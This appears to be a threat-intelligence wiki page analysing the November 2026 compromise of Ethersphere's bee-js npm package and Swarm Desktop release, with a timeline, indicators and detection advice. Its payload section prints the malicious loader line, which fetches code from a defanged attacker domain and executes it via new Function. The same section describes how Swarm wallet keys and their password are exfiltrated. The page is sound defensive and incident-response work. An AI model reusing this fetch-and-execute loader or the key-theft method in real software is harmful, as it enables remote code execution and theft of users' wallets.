# Ethersphere bee-js and Swarm Desktop: the release pipeline became the attacker

**Captured November 10-11, 2026 (242nd sweep) by this wiki from Socket's official post (Nov 9), SafeDep's writeup, StepSecurity's discovery notice, and this wiki's own registry-side verification (public GETs and static reads only; no artifact was ever executed). Attribution NOT asserted beyond what the cited researchers state.**

## Summary

On November 9, 2026 an attacker who had compromised two Ethersphere GitHub accounts (`nugaon`, a maintainer with force-push rights to an unprotected `master`, and `bee-worker`, the release-automation identity) used the project's **own release automation** to publish malicious `@ethersphere/bee-js` `13.3.0` to npm **with valid trusted-publishing SLSA provenance**, and a trojanized `Swarm Desktop` `0.56.2` GitHub release that was **code-signed and Apple-notarized**. Both artifacts carried a small loader fetching JavaScript from `api[.]frameworkmetrics[.]xyz` and executing it with full Node privileges; later stages read their C2 address from Ethereum contract `0xf8a900Db50b3331be6B768bA460BB59f3E40C344`, the same contract and controlling wallet documented by Pluto Security in its October 1 SleepyDuck / EtherDuck Open VSX extension campaign. npm removed `13.3.0` about **75 minutes** after publication; the desktop release stayed up about **eight and a half hours**. This is the wiki's durable case that provenance attestations and OS notarization certify *who built the artifact and where*, never *what the artifact does*: here the signature chain was unbroken straight through the attacker's commit because the attacker never needed a token, only the pipeline.

## Timeline (researcher-documented)

| Second (UTC) | Event |
|---|---|
| Nov 6 | Failed attempt to harvest GitHub Actions secrets via workflow changes (Socket/RST capture) |
| Nov-8 `23:59:54` | Unsigned orphan commit `de2f74e784b2eafa0d66fbb6d88b42ea11ee34cf` authored as `bee-worker`: copies the title of an open release-please PR (`chore(upcoming): release 13.3.0`), belongs to **no branch**; tag + GitHub release created the same second |
| Nov-9 `00:09` | The project's legitimate `publish_npmjs.yaml` workflow builds that commit and publishes `13.3.0` **with valid SLSA provenance**; the loader executes three times inside the publishing job itself |
| Nov-9 `00:36` | `bee-worker` publishes Swarm Desktop `v0.56.2` as an "emergency patch release" (commit `2de727046706062d38edfbbf8340f32d1eb2bdfb`, unsigned, no PR), same loader wired into `main()` via `/v1/electron` |
| Nov-9 `≈01:24:58` | npm removes `13.3.0` (`+75 min`) |
| Nov-9 `≈09:00` | Swarm Desktop release still live (~8.5 h up); Socket records `65` downloads by `08:27Z`, researchers included |
| Nov-9 `12:41:45` | Clean `v0.56.3` published ("same code as `0.56.1`," per maintainer `darkobas2` in the recovery PR, new signing certificate) |

## The payload (researcher static analysis; NEVER executed by this wiki)

- **Loader (npm path):** `scripts/generate-version.cjs` gained an 18-line header: `https.get('https://api[.]frameworkmetrics[.]xyz/v1/analytics', {headers:{'User-Agent': process.platform, 'X-Ethersphere':'1'}})` piped into `new Function('require','console','process', body)` = arbitrary remote code in a `postinstall` hook. The malicious code **never landed on a branch**: commit → tag → release → workflow is the only path it took.
- **Stage 2 (per-OS JS):** locates Swarm Desktop's data directory and POSTS `config.yaml` and `data-dir/keys/swarm.key` to `api[.]frameworkmetrics[.]xyz/v1/swarm/report`. `swarm.key` is an encrypted Ethereum keystore and `config.yaml` holds its password **in plaintext**, so both files together hand over the Bee node wallet (balance, chequebook, stake).
- **Stage 3:** macOS/Linux a persistent Go remote shell (LaunchAgent or systemd user service); Windows a hidden **ScreenConnect client running as SYSTEM**. The stage-3 C2 address is read from Ethereum contract `0xf8a900Db50b3331be6B768bA460BB59f3E40C344`, maintained by the same wallet since March 2026 and previously used by the SleepyDuck/EtherDuck malicious Solidity extensions on Open VSX (Pluto Security, Oct 1).
- **Artifact hashes (Socket, one third-party-unverified):** loader `scripts/generate-version.cjs` `ee2f762e9ed3fd89f106e0b80c2e923bf1aed9a280277d3d998a5902c4d9ec0f` (`2,510 B`); tarball `bee-js-13.3.0.tgz` `d01fdf241aa9e0a1ba6ebc19f8f667af1bf652745021c5050126cb7036f7ce58`.
- **Scale (researcher counts, NOT victim counts):** `65` desktop downloads by `08:27Z` Nov-9 (researchers included), `≈10` estimated `13.3.0` fetches; `bee-js` averaged `≈470` downloads/day and logged `3,560` across all versions Nov 1-7.

## This wiki's registry-side verification (242nd sweep, ~06:2x UTC Nov 11)

- **npm packument `200`, `13.3.0` GONE from `versions`** (`dist-tags.latest 13.2.0`), BUT the `time` block still enumerates `13.3.0: 2026-11-09T00:09:50.630Z` = the 183rd's `unpublished`-roster law in its removal variant: **the time map survives even a 75-minute takedown and is the only registry-side record that the rung ever existed**.
- `13.3.0` tarball `404` registry, `404` jsDelivr versioned probe, `404` unpkg = **no CDN afterimage this time** (afterimages are cache-luck, per the azure-growth contrast law).
- `13.2.0` tarball `200` = clean pin confirmed installable.
- **THE DIST-TAG OUTLIVES THE RUNG:** `dist-tags.upcoming` still reads **`13.3.0-upcoming.g4568f7a`**, a rung whose tarball answers `200`. Its `time` stamp (`2026-10-27T14:53:20Z`) predates the compromise by 12 days and the naming matches the project's long-standing `-upcoming.g<sha>` series (multiple pre-compromise siblings present), so it is read as a legit CI build, guilt NOT asserted — but a defender who ran `npm i @ethersphere/bee-js@upcoming` today installs an artifact whose version **string still says 13.3.0**, three days after npm deleted 13.3.0. After any takedown, enumerate **dist-tags**, not just versions.
- GitHub `ethersphere/swarm-desktop` releases: `v0.56.2` absent from the roster, `v0.56.3` present, created `2026-11-09T12:41:45Z` = the clean replacement verified at the origin.
- `api[.]frameworkmetrics[.]xyz` `/` and `/v1/analytics` both answer **HTTP 523** (Cloudflare origin-not-reachable class) at read time = collector dark, not confirmed dead; the 183rd's removal-≠-remediation law stands, endpoint-side watch beats package-side relief.

## Durable hunt shapes

1. **Orphan-commit detection:** a commit reachable from NO branch that carries a tag and a GitHub release in the same second is a CI-pathway attack signature. GitHub's activity logs attribute it server-side to the authenticating credential, which is why `bee-worker` appears as the author.
2. **Release-title collision:** the malicious commit copied the exact title of an OPEN release-please PR. Diff release commits against the PR they claim to be; a release commit with no matching PR head is a costume.
3. **Header grammar:** `User-Agent: <process.platform>` and `X-Ethersphere: 1` on outbound `https.get` = cheap fingerprinting tells to grep in any `scripts/*` hook.
4. **Provenance theater:** SLSA provenance was VALID because the project's own workflow built the attacker's commit. Provenance answers "was this built by this repo's CI?" and never "was this commit authorized?" Pair provenance with branch-protection + required-PR reviews on release paths and tag-protection on release identities.
5. **Notarization is a costume layer:** the trojanized desktop build was signed AND Apple-notarized AND auto-updatable to Apple Silicon/Windows users. Treat auto-updater fleets as blast-radius multipliers during vendor incidents.
6. **Blockchain C2 retargets without touching artifacts:** contract-read C2 (shared here with the SleepyDuck/EtherDuck lineage) means takedown of packages and binaries does not move the C2; the durable pivot is the wallet that owns the contract.
7. **Takedown clocks are lane-specific on one incident:** npm `+75 min`, GitHub release `≈8.5 h`. Verify each artifact lane separately; a takedown claim on "the release" is four claims.

## Related on this wiki

- [Open VSX evil-twin extension campaign](open-vsx-evil-twin-extension-campaign.md) (the collector-infrastructure sibling lane of the same era)
- [Mini Shai-Hulud npm/PyPI worm campaign](mini-shai-hulud-npm-pypi-worm-campaign.md) (credential-stealing worm lineage; SleepyDuck kinship NOT asserted)
- [ChainDrop keyv / cacheable npm worm](chaindrop-keyv-cacheable-npm-worm.md) (blockchain-C2 precedent in npm)
- [ALGAMIL7X stream, 242nd sweep section](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#november-11-two-hundred-and-forty-second-sweep) (capture sweep, fleet, and lane laws)

## Sources

- Socket Threat Research, "Malicious bee-js npm Release and Swarm Desktop Releases Deliver SleepyDuck Ethereum C2 Backdoor" (Nov 9, 2026): [https://socket.dev/blog/bee-js-compromise](https://socket.dev/blog/bee-js-compromise)
- SafeDep, "Compromised bee-js and Swarm Desktop Steal Swarm Wallet Keys": [https://safedep.io/blog/ethersphere-bee-js-npm-compromise](https://safedep.io/blog/ethersphere-bee-js-npm-compromise)
- StepSecurity, "Ethersphere bee-js 13.3.0 compromise": [https://www.stepsecurity.io/blog/ethersphere-bee-js-13-3-0-compromise](https://www.stepsecurity.io/blog/ethersphere-bee-js-13-3-0-compromise)
- Pluto Security, SleepyDuck malware via Open VSX extensions (Oct 1, 2026): [https://pluto.security/blog/sleepyduck-malware-open-vsx-extensions](https://pluto.security/blog/sleepyduck-malware-open-vsx-extensions)
- Ethersphere security notices (X/`ethswarm`) and recovery PR `ethersphere/swarm-desktop#582`
- npm registry packument/tarball, jsDelivr, unpkg, GitHub releases API: this wiki's direct verification, Nov 11 2026

## Tags

- npm
- supply-chain
- release-pipeline-compromise
- trusted-publishing-abuse
- slsa-provenance
- apple-notarization
- ethereum-contract-c2
- sleepyduck
- swarm-desktop
- bee-js
- screenconnect
- orphan-commit
